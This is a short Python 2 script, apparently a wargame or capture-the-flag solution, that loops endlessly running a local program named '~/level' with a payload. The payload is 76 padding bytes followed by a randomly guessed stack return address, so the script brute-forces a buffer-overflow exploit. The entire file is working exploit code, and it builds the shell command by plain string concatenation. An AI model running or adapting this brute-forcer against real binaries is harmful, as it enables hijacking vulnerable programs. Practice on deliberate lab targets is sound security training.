#!/usr/bin/env python
# -*- coding: utf-8 -*- 
#0xbfXXXe56

from random import randrange as randy

hex_string = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f"]

padding = "\\x42" * 76
progpath = "~/level"
import os
import subprocess

while True:
  ca = randy(0,15)
  cb = randy(0,15)
  cc = randy(0,15)
  sentence = "\\x6e\\x%s7\\x%s%s\\xbf" % (hex_string[ca],hex_string[cc],    hex_string[cb])
  #print sentence
  print "0xbf%s%s%s76e" % (hex_string[cc],hex_string[cb],hex_string[ca])
  #sentence = padding + sentence
  #print os.popen("echo $(python -c 'print \""+sentence+"\"')").read().strip(' \t\n\r')
  sentence = padding + sentence
  print os.popen( progpath +" $( python -c 'print  \""+sentence+"\"' )" ).read().strip(' \t\n\r')
